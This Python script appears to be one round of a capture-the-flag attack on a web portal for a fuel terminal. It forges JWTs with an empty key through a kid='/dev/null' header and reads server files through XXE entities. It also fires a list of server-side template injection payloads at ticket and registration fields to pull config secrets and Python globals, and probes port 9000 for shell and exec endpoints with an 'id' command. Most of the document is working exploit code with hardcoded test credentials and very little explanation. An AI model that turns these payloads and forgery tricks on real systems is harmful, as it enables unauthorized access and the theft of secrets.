#!/usr/bin/env python3
"""round59 — SSTI via custody tickets, template discovery, port 9000 JWT, probe response analysis"""
import requests, time, json, hmac as hm, hashlib, base64, re

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"
P9000 = f"http://{HOST}:9000"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

KNOWN_URL = "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
KNOWN_SIG = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
        return r.status_code, r.text
    except Exception as e:
        return -1, str(e)

# ============================================================
print("="*70)
print("PHASE 1: SSTI VIA CUSTODY TICKETS")
print("="*70)

# Step 1: Ingest tickets with SSTI payloads in ALL fields
ssti_payloads = [
    ("{{config}}", "config dump"),
    ("{{config.items()}}", "config items"),
    ("{{config['SECRET_KEY']}}", "SECRET_KEY"),
    ("{{config['PROBE_SECRET']}}", "PROBE_SECRET"),
    ("{{request.environ}}", "request environ"),
    ("{{self.__init__.__globals__}}", "globals"),
    ("{{''.__class__.__mro__[1].__subclasses__()}}", "subclasses"),
    ("{{get_flashed_messages.__globals__}}", "flash globals"),
    ("{{url_for.__globals__}}", "url_for globals"),
    ("{{lipsum.__globals__}}", "lipsum globals"),
    ("{{cycler.__init__.__globals__}}", "cycler globals"),
    ("${7*7}", "expression lang"),
    ("#{7*7}", "ruby style"),
    ("<%= 7*7 %>", "erb style"),
    ("{{7*7}}", "simple math"),
    ("{{7*'7'}}", "string repeat"),
]

# Ingest with payload in remarks
for payload, desc in ssti_payloads:
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <reference>SSTI-{desc[:10]}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>{payload}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=5)
        resp = r.text[:300]
        # Check if SSTI executed (response contains evaluated result)
        if r.status_code == 200:
            data = r.json()
            remarks_val = data.get("ticket", {}).get("remarks", "")
            if remarks_val != payload and remarks_val:
                print(f"  *** SSTI [{desc}]: {remarks_val[:300]} ***")
            elif remarks_val == payload:
                pass  # Reflected as-is, no SSTI
            else:
                # Check entire response
                if "49" in resp or "7777777" in resp:
                    print(f"  *** SSTI MATH [{desc}]: {resp} ***")
        elif r.status_code != 400:
            print(f"  [{r.status_code}] {desc}: {resp}")
    except Exception as e:
        print(f"  Error [{desc}]: {e}")

print("  Direct SSTI in custody/ingest response: checking...")

# Step 2: Check portal for rendered tickets
print("\n  Logging in to check portal...")
try:
    lr = S.post(f"{CASPI}/api/auth/login",
                json={"email": "ctf_fubznz@caspiterminal.kz", "password": "Ctffubznz2026!"},
                headers={"Content-Type": "application/json"}, timeout=5)
    if lr.status_code == 200:
        login_data = lr.json()
        token = login_data.get("token", "")
        print(f"  Login OK, token: {token[:50]}...")

        carrier_hdr = {"Authorization": f"Bearer {token}"}

        # Check portal
        pr = S.get(f"{CASPI}/portal", headers=carrier_hdr, timeout=5)
        print(f"  /portal [{pr.status_code}] ({len(pr.text)} bytes)")

        if pr.status_code == 200:
            # Look for SSTI results
            if "{{" not in pr.text and ("Config" in pr.text or "SECRET" in pr.text or "49" in pr.text):
                print(f"  *** SSTI MIGHT HAVE WORKED! ***")

            # Extract all text content
            text = re.sub(r'<[^>]+>', ' ', pr.text)
            text = ' '.join(text.split())
            print(f"  Portal text: {text[:1000]}")

            # Extract JS
            scripts = re.findall(r'<script[^>]*>(.*?)</script>', pr.text, re.DOTALL)
            for i, s in enumerate(scripts):
                if s.strip():
                    print(f"  Script {i}: {s.strip()[:500]}")

            # All links
            links = re.findall(r'(?:href|src|action)=["\']([^"\']+)', pr.text)
            if links:
                print(f"  Links/sources: {links}")

            # API calls
            api_calls = re.findall(r'fetch\(["\']([^"\']+)', pr.text)
            if api_calls:
                print(f"  API calls: {api_calls}")

                # Follow each API call
                for api_url in api_calls:
                    full_url = api_url if api_url.startswith('http') else f"{CASPI}{api_url}"
                    try:
                        ar = S.get(full_url, headers=carrier_hdr, timeout=5)
                        print(f"    API [{ar.status_code}] {api_url}: {ar.text[:300]}")
                    except:
                        pass

            # Form actions
            forms = re.findall(r'<form[^>]*action=["\']([^"\']*)', pr.text)
            if forms:
                print(f"  Forms: {forms}")

        # Check /portal with operator JWT (different view?)
        pr2 = S.get(f"{CASPI}/portal", headers=AUTH_OP, timeout=5)
        print(f"\n  /portal [operator] [{pr2.status_code}]")
        if pr2.status_code == 200 and pr2.text != pr.text:
            print(f"  Different content! ({len(pr2.text)} bytes)")
            text2 = re.sub(r'<[^>]+>', ' ', pr2.text)
            print(f"  {' '.join(text2.split())[:500]}")

        # Check other portal paths
        for pp in ["/portal/tickets", "/portal/custody", "/portal/history",
                   "/portal/dashboard", "/portal/profile", "/portal/settings"]:
            try:
                r = S.get(f"{CASPI}{pp}", headers=carrier_hdr, timeout=3)
                if r.status_code != 404:
                    print(f"  [{r.status_code}] {pp}: {r.text[:200]}")
            except:
                pass

    else:
        print(f"  Login failed: [{lr.status_code}] {lr.text[:200]}")
except Exception as e:
    print(f"  Login/Portal error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: TEMPLATE FILE DISCOVERY")
print("="*70)

template_names = [
    "base.html", "index.html", "login.html", "portal.html",
    "register.html", "404.html", "500.html", "error.html",
    "ops.html", "ops/index.html", "ops/probe.html", "ops/custody.html",
    "ops/diagnostics.html", "dashboard.html", "tickets.html",
    "layout.html", "main.html", "home.html", "admin.html",
    "shell.html", "llehs.html", "probe.html", "custody.html",
    "ingest.html", "report.html", "ticket.html", "ticket_detail.html",
    # Jinja2 partials
    "_header.html", "_footer.html", "_nav.html", "_sidebar.html",
    "includes/header.html", "includes/footer.html",
    # Email templates
    "email/welcome.html", "email/reset.html",
    # Non-HTML
    "config.j2", "env.j2", "settings.j2",
    # Text
    "probe_secret.txt", "secret.txt", "flag.txt",
]

for tpl in template_names:
    path = f"/app/templates/{tpl}"
    code, text = xxe_read(path)
    if code == 400:
        print(f"  EXISTS (400): {path}")
    elif code == 200:
        try:
            data = json.loads(text)
            val = data.get("ticket", {}).get("remarks", "")
            if val and val != "R":
                print(f"  READABLE: {path}: {val[:300]}")
        except:
            pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: PORT 9000 WITH JWT AUTHENTICATION")
print("="*70)

# Maybe port 9000 needs JWT auth to unlock endpoints
for role in ["operator", "admin", "carrier", "root", "superadmin", "shell", "llehs"]:
    token = jwt_forged(role)
    hdr = {"Authorization": f"Bearer {token}"}

    for path in ["/", "/shell", "/llehs", "/exec", "/api", "/cmd",
                 "/run", "/terminal", "/console"]:
        try:
            r = requests.get(f"{P9000}{path}", headers=hdr, timeout=3)
            if r.status_code != 404:
                print(f"  [{r.status_code}] {path} role={role}: {r.text[:200]}")
        except:
            pass

        try:
            r = requests.post(f"{P9000}{path}",
                             json={"cmd": "id", "command": "id"},
                             headers={**hdr, "Content-Type": "application/json"}, timeout=3)
            if r.status_code != 404:
                print(f"  [{r.status_code}] POST {path} role={role}: {r.text[:200]}")
        except:
            pass

# Try with the real carrier JWT from login
try:
    lr = S.post(f"{CASPI}/api/auth/login",
                json={"email": "ctf_fubznz@caspiterminal.kz", "password": "Ctffubznz2026!"},
                timeout=5)
    if lr.status_code == 200:
        real_token = lr.json().get("token", "")
        real_hdr = {"Authorization": f"Bearer {real_token}"}
        for path in ["/", "/shell", "/llehs", "/api", "/healthz"]:
            try:
                r = requests.get(f"{P9000}{path}", headers=real_hdr, timeout=3)
                if r.status_code != 404:
                    print(f"  [{r.status_code}] {path} [real carrier JWT]: {r.text[:200]}")
            except:
                pass
except:
    pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: FULL PROBE RESPONSE ANALYSIS")
print("="*70)

all_sigs = {
    "lm-01": ("http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
              "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"),
    "tk-01": ("http://gauge-gw.internal:9100/v1/tanks/1/level",
              "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"),
    "tk-02": ("http://gauge-gw.internal:9100/v1/tanks/2/level",
              "0e996e2ff657529641db10233f9f863a846e06b178c6ad37908185a190a66197"),
    "tk-03": ("http://gauge-gw.internal:9100/v1/tanks/3/level",
              "c0a3f9ef039f26fe9a8bcfb41b71427587dc88dc0ef600b1c49488b072f2c9d3"),
    "tk-07": ("http://gauge-gw.internal:9100/v1/tanks/7/level",
              "447a4c0f1fa7769cdfb2b67842364d8b699b5e85a5b2784524146f7a5af5132f"),
}

for device, (url, sig) in all_sigs.items():
    try:
        r = S.post(f"{CASPI}/api/ops/probe",
                   json={"url": url, "sig": sig},
                   headers=AUTH_OP, timeout=10)
        print(f"\n  {device} [{r.status_code}]:")
        print(f"    Headers: {dict(r.headers)}")
        print(f"    Body: {r.text[:500]}")
        if r.status_code == 200:
            try:
                data = r.json()
                # Print ALL fields
                for k, v in data.items():
                    print(f"    {k}: {str(v)[:300]}")
            except:
                pass
    except Exception as e:
        print(f"  {device}: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: CUSTODY INGEST — FULL RESPONSE ANALYSIS")
print("="*70)

# Ingest a clean ticket and analyze the FULL response
xml_clean = '''<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <reference>ANALYSIS-001</reference>
  <tankId>T-01</tankId><product>Diesel</product>
  <grossVolume>100</grossVolume><netVolume>95</netVolume>
  <density>0.845</density><temperature>20.5</temperature>
  <carrier>TestCarrier</carrier>
  <remarks>TestRemarks</remarks>
</ticket>'''
try:
    r = S.post(f"{CASPI}/api/ops/custody/ingest",
        data=xml_clean, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=5)
    print(f"  [{r.status_code}] Full response:")
    print(f"    Headers: {dict(r.headers)}")
    print(f"    Body: {r.text[:1000]}")
    if r.status_code == 200:
        data = r.json()
        print(f"    JSON keys: {list(data.keys())}")
        if isinstance(data, dict):
            for k, v in data.items():
                print(f"    {k}: {v}")
except Exception as e:
    print(f"  Error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: SSTI IN REGISTRATION FIELDS")
print("="*70)

# Register with SSTI in company name
ssti_email = f"ssti_{int(time.time())}@test.kz"
try:
    r = S.post(f"{CASPI}/api/auth/register",
               json={"email": ssti_email,
                     "password": "Test123!",
                     "company": "{{config.PROBE_SECRET}}"},
               timeout=5)
    print(f"  Register with SSTI company: [{r.status_code}] {r.text[:300]}")

    if r.status_code in [200, 201]:
        # Login and check /api/auth/me
        lr = S.post(f"{CASPI}/api/auth/login",
                    json={"email": ssti_email, "password": "Test123!"},
                    timeout=5)
        if lr.status_code == 200:
            token = lr.json().get("token", "")
            me = S.get(f"{CASPI}/api/auth/me",
                       headers={"Authorization": f"Bearer {token}"}, timeout=5)
            print(f"  /me after SSTI register: {me.text[:300]}")

            # Check portal
            portal = S.get(f"{CASPI}/portal",
                          headers={"Authorization": f"Bearer {token}"}, timeout=5)
            company_in_portal = re.search(r'config|PROBE|SECRET', portal.text)
            if company_in_portal:
                print(f"  *** SSTI IN PORTAL! ***")
                print(f"  Portal excerpt: {portal.text[:1000]}")
except Exception as e:
    print(f"  SSTI register error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: /services PAGE — FULL ANALYSIS")
print("="*70)

try:
    r = S.get(f"{CASPI}/services", timeout=5)
    print(f"  /services [{r.status_code}] ({len(r.text)} bytes)")
    if r.status_code == 200:
        # Full text extraction
        text = re.sub(r'<[^>]+>', ' ', r.text)
        text = ' '.join(text.split())
        print(f"  Text: {text[:1000]}")

        # All links
        links = re.findall(r'(?:href|src|action)=["\']([^"\']+)', r.text)
        print(f"  Links: {links}")

        # Data attributes
        data_attrs = re.findall(r'data-[a-z-]+=["\']([^"\']+)', r.text)
        if data_attrs:
            print(f"  Data attrs: {data_attrs}")

        # Hidden inputs
        hidden = re.findall(r'<input[^>]+type=["\']hidden["\'][^>]*>', r.text)
        if hidden:
            print(f"  Hidden inputs: {hidden}")
except Exception as e:
    print(f"  Error: {e}")

# Also check main page
try:
    r = S.get(f"{CASPI}/", timeout=5)
    print(f"\n  / [{r.status_code}] ({len(r.text)} bytes)")
    text = re.sub(r'<[^>]+>', ' ', r.text)
    text = ' '.join(text.split())
    print(f"  Text: {text[:500]}")
except Exception as e:
    print(f"  Error: {e}")

print("\n"+"="*70)
print("DONE")
print("="*70)
